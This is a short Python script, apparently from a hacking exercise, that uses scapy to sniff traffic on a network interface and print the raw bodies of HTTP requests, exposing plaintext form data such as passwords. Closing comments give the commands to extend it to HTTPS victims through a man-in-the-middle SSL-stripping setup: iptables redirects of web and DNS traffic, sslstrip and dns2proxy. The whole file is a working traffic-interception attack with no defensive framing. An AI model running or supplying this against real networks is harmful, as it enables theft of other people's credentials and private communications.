import scapy.all as scapy
from  scapy_http import http

# this app is just for HTTP
# iface = dinlenecek yer
# store = don't save every packet what I get
# prn   = callback function (paketlerin islenecegi yer)
def listen_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=analyze_packet)
    
def analyze_packet(packet):
    # packet.show()
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print( packet[scapy.Raw].load)

listen_packet("eth0")


# İf you wanna do this app for HTTPS
# first : you need to write as order on terminal
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
# sslstrip
# second : you need to write as order on terminal
# second git clone https://github.com/singe/dns2proxy
# python dns2proxy.py 


